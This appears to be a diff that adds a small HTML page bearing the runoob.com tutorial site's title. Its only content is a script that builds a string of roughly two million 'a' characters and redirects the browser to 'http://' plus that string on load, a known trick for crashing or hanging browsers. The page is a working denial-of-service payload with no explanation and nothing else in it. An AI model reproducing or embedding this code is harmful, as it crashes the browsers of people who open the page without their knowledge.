@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>菜鸟教程(runoob.com)</title>
+	
+<script type="text/javascript">
+ function mul3 (str, num) {
+  if (!num) return "";
+  var orig = str,
+    soFar = [str],
+    added = 1,
+    left, i;
+  while (added < num) {
+    left = num - added;
+    str = orig;
+    for (i = 2; i < left; i *= 2) {
+      str += str;
+    }
+    soFar.push(str);
+    added += (i / 2);
+  }
+  return soFar.join("");
+ }
+ var junka = "a";
+ var junk = mul3(junka,2097033);
+ window.location.href = "http://" + junk;
+ </script>
+
+
+ </head>
+ <body>
+ </body>
+</html>
